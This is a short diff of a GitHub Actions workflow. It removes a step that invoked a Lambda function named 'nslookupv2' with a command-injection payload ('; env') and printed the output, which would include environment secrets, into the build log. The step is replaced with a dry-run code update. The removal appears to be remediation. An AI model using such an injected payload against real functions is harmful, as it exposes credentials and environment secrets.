@@ -21,13 +21,4 @@ jobs:
 
       - name: Invoke Vulnerable Lambda
         run: |
-          # 1. Trigger the Lambda with an injected command (e.g. '; env')
-          aws lambda invoke \
-            --function-name nslookupv2 \
-            --cli-binary-format raw-in-base64-out \
-            --payload '{"domain": "; env"}' \
-            response.json
-
-          # 2. Print the response directly into the GitHub Actions log
-          echo "=== LAMBDA OUTPUT ==="
-          cat response.json
+           aws lambda update-function-code --function-name nslookupv2 --dry-run
